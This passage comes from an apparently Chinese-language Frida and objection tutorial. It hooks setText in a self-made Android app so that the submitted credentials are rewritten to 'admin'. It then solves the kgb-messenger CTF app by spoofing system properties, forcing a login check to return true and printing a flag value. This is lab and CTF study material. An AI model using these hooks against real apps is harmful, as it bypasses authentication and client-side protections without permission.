class="operator">=</span> (EditText) <span class="built_in">this</span>.findViewById(R.id.editTextTextPersonName);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">password</span> <span class="operator">=</span> (EditText) <span class="built_in">this</span>.findViewById(R.id.editTextTextPersonName2);</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">message</span> <span class="operator">=</span> (TextView) findViewById(R.id.textView3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (username.getText().toString().compareTo(<span class="string">&quot;admin&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    message.setText(<span class="string">&quot;You can not login as admin&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message.setText(<span class="string">&quot;Sending to the server:&quot;</span> + Base64.encodeToString((username.getText().toString() + <span class="string">&quot;:&quot;</span> + password.getText().toString()).getBytes(),Base64.DEFAULT));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个APK的逻辑是输入用户名和密码，用户名不能是admin，输入的用户名和密码通过“:”连接进行Base64加密。</p><p>最后一条语句是我们hook的目标。我们可以hook <code>setText()</code>方法，转到定义可以看到它有很多重载。</p><img src="/posts/ab7319a3/5.3.1.png" class=""><p>那么可以用objection来看看它到底走了哪个重载。将该方法的所有重载都hook上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.widget.TextView.setText --dump-args --</span><br><span class="line">dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p>输入用户名和密码查看哪个重载被调用。是java.lang.CharSequence。</p><img src="/posts/ab7319a3/5.3.2.png" class=""><p>编写hook代码，单纯打印<code>setText()</code>方法传入的参数及返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test03.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>).<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">setText</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x.toString(), result&quot;</span>, x.<span class="title function_">toString</span>(), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.v5le0n9.test03 -l test03.js</span><br></pre></td></tr></table></figure><p>输入用户名与密码，点击Login，成功捕获到传入<code>setText()</code>方法的参数。</p><img src="/posts/ab7319a3/5.3.3.png" class=""><p>hook没问题后，开始利用RPC动态修改参数的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test03.js</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>).<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send_x = x.<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">var</span> string_to_recv</span><br><span class="line">        <span class="comment">//发送参数</span></span><br><span class="line">        <span class="title function_">send</span>(string_to_send_x)</span><br><span class="line">        <span class="comment">//接收参数</span></span><br><span class="line">        <span class="title function_">recv</span>(<span class="keyword">function</span>(<span class="params">received_json_objection</span>)&#123;</span><br><span class="line">            string_to_recv = received_json_objection.<span class="property">my_data</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv:&quot;</span> + string_to_recv)</span><br><span class="line">        &#125;).<span class="title function_">wait</span>()</span><br><span class="line">        <span class="keyword">var</span> javaStringTosend = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(string_to_recv)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">setText</span>(javaStringTosend)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test03loader.py</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)<span class="comment">#打印出一个字典</span></span><br><span class="line">    <span class="built_in">print</span>(payload)<span class="comment">#None</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])<span class="comment">#打印关键字“payload”的值</span></span><br><span class="line">        data = message[<span class="string">&quot;payload&quot;</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip()<span class="comment">#以“:”分隔,将“:”后面的字符串赋值给data</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message:&quot;</span>, message)</span><br><span class="line">        data = <span class="built_in">str</span>(base64.b64decode(data))<span class="comment">#解密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;data:&quot;</span>,data)<span class="comment">#打印解密后的字符串</span></span><br><span class="line">        usr,pw = data.split(<span class="string">&quot;:&quot;</span>)<span class="comment">#用“:”分隔用户名与密码并赋值给usr和pw</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pw&quot;</span>,pw)<span class="comment">#打印密码</span></span><br><span class="line">        data = <span class="built_in">str</span>(base64.b64encode((<span class="string">&quot;admin&quot;</span> + <span class="string">&quot;:&quot;</span> + pw).encode()))<span class="comment">#构造用户名与密码组合，用base64加密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;encode data&quot;</span>,data)</span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>:data&#125;)<span class="comment">#将data的值发送到test03.js中id为my_data处</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Modified data sent&quot;</span>)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;com.v5le0n9.test03&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test03.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"><span class="built_in">input</span>()<span class="comment">#当作暂停用</span></span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/5.3.4.png" class=""><h1 id="6-RPC开到公网"><a href="#6-RPC开到公网" class="headerlink" title="6. RPC开到公网"></a>6. RPC开到公网</h1><p>使用5.2.2的例子，主动调用<code>secret()</code>函数。如果我们进行一系列端口转发操作，将手机的IP地址通过一系列的映射，映射到云服务器(VPS)上，是什么样的结果呢？</p><p>常用的端口转发工具nps、frp，frp稳定性高于nps，但nps有Web界面，方便调试。</p><p>搭建nps。在主机上安装服务端，手机上安装客户端。由于需要云服务器，先跳过吧。</p><h1 id="7-综合案例"><a href="#7-综合案例" class="headerlink" title="7. 综合案例"></a>7. 综合案例</h1><p>使用的案例是<a href="https://github.com/w1214292886/kgb_messenger">kgb-messenger</a>这个开源项目的APK。</p><p>将APK安装到手机上，开启frida-server，将APK或DEX文件载入jadx查看APK的包名，使用objection让它跑起来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.tlamb96.spetsnazmessenger explore</span><br></pre></td></tr></table></figure><p>查看该APK有哪些activities：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.1.png" class=""><p>尝试是否可以直接某个activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_activity com.tlamb96.kgbmessenger.MainActivity</span><br><span class="line">android intent launch_activity com.tlamb96.kgbmessenger.MessengerActivity</span><br><span class="line">android intent launch_activity com.tlamb96.kgbmessenger.LoginActivity</span><br></pre></td></tr></table></figure><p>发现MainActivity不行，说只能运行在俄罗斯的设备上。但MessengerActivity和LoginActivity是可以直接intent进去的，当然可能是这个APK防护不到位才给我们钻了空子。</p><p>那我们先把MainActivity搞定，如何才能绕过这个错误框。在jadx中查找错误信息，发现这个错误信息就在MainActivity中。</p><img src="/posts/ab7319a3/7.1.2.png" class=""><img src="/posts/ab7319a3/7.1.3.png" class=""><p>上面流程太清楚了，只要hook <code>getProperty()</code>方法修改它的返回值为“Russia”，和修改<code>getenv()</code>方法的返回值让它为下图的值即可。</p><img src="/posts/ab7319a3/7.1.4.png" class=""><p>首先要找到System的包名，右键发现走不到它的定义处。可以看Smali代码，搜索System，发现找到它在java.lang包中。</p><img src="/posts/ab7319a3/7.1.5.png" class=""><img src="/posts/ab7319a3/7.1.6.png" class=""><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getProperty,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getenv</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getenv</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getenv,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>由于是在App启动一开始就执行了这两个方法，所以使用-f选项，执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.tlamb96.spetsnazmessenger -l kgb.js --no-pause</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.7.png" class=""><p><code>getProperty()</code>方法竟然没有显示返回值，<code>getenv()</code>方法返回值为空。但我们从Smali中分明看到两个方法的返回值都是String类型。所以不用管那么多，我们直接修改它们的返回值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getProperty,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;Russia&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getenv</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getenv</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getenv,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.8.png" class=""><p>这样就成功跳转到LoginActivity。输入用户名和密码，显示“User not recognized.”。同样搜索关键字，发现在LoginActivity中，查看Java代码，发现用户名，还有密码经过加密后的字符串都在<code>strings.xml</code>中，直接找到即可。</p><img src="/posts/ab7319a3/7.1.9.png" class=""><img src="/posts/ab7319a3/7.1.10.png" class=""><p>用户名为：codenameduchess</p><p>密码经过加密后为：84e343a0486ff05530df6c705c8bb4</p><p>用户名可以直接输入或hook <code>setText()</code>方法；由于我们不知道传入的密码，只知道最终的加密结果，所以我们直接hook <code>j()</code>方法。而<code>j()</code>方法的返回值是个boolean值，所以返回true万事大吉。</p><p>直接输入的话，选中文本框，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bullhead:/ $ input text &quot;codenameduchess&quot;</span><br></pre></td></tr></table></figure><p>当我尝试hook <code>setText()</code>方法时，出现错误：</p><img src="/posts/ab7319a3/7.1.11.png" class=""><p>那我们就增加一个参数，这个参数应该是辨认TextView的id值，确保我们在众多文本框中找到特定id值的文本框。这个参数我们不需要修改。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getProperty,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;Russia&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getenv</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getenv</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getenv,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.EditText&quot;</span>).<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.CharSequence&#x27;</span>, <span class="string">&#x27;android.widget.TextView$BufferType&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,type</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">setText</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;codenameduchess&quot;</span>),type)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tlamb96.kgbmessenger.LoginActivity&quot;</span>).<span class="property">j</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(login)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.12.png" class=""><p>成功登录。是一个群聊界面，搜索群聊的信息查看在哪个Activity，在MessengerActivity中。</p><img src="/posts/ab7319a3/7.1.13.png" class=""><img src="/posts/ab7319a3/7.1.14.png" class=""><p>从流程来看，我们输入的信息经过<code>MessengerActivity.a()</code>方法加密等于p，经过<code>MessengerActivity.b()</code>方法加密等于r。我们直接hook <code>a()</code>和<code>b()</code>方法，修改它们的返回值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getProperty,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;Russia&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.System&quot;</span>).<span class="property">getenv</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getenv</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getenv,result&quot;</span>,x,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.EditText&quot;</span>).<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.CharSequence&#x27;</span>, <span class="string">&#x27;android.widget.TextView$BufferType&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,type</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">setText</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;codenameduchess&quot;</span>),type)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tlamb96.kgbmessenger.LoginActivity&quot;</span>).<span class="property">j</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tlamb96.kgbmessenger.MessengerActivity&quot;</span>).<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">a</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a:&quot;</span>,x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            <span class="comment">//return Java.use(&quot;java.lang.String&quot;).$new(&quot;V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003&quot;)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tlamb96.kgbmessenger.MessengerActivity&quot;</span>).<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">b</span>(x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b:&quot;</span>,x)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            <span class="comment">//return Java.use(&#x27;java.lang.String&#x27;).$new(&quot;\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000&quot;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(message)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.15.png" class=""><p>吐了呀姐妹，怎么一直崩溃。<code>a()</code>可以成功hook，但<code>b()</code>方法一直崩溃，这个错误提示看得我云里雾里。</p><img src="/posts/ab7319a3/7.1.16.png" 